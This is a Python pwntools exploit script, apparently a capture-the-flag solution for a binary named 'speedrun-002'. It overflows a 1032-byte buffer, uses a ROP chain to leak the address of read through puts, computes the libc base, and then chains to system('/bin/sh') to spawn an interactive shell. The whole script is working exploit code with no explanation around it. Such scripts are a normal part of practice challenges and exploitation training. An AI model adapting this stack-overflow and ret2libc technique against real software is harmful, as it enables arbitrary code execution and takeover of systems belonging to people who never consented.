from pwn import *

e = ELF('./speedrun-002')
p = process('./speedrun-002')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc6_2.30-0ubuntu2_amd64.so')

puts_addr = e.symbols['puts']
read_addr = e.got['read']
ret_addr = 0x00400576
pop_rdi_addr = 0x004008a3

p.sendline('Everything intelligent is so boring.')
print p.recvuntil('Tell me more.\n')

payload = 'A'*1032
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(read_addr)
payload += p64(puts_addr)
payload += p64(0x400600)
#payload += p64(0xffffffffffffffdd)
p.sendline(payload)
print p.recvline()
ret = u64(p.recvline().rstrip('\n') + '\x00\x00')
print "read: " + hex(ret)
libc_base_addr = ret - libc.symbols['read']
system_addr = libc.symbols['system'] + libc_base_addr
binsh_addr = next(libc.search("/bin/sh")) + libc_base_addr

payload = 'A'*1032
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendline('Everything intelligent is so boring.')
print p.recvuntil('Tell me more.\n')
p.sendline(payload)
p.interactive()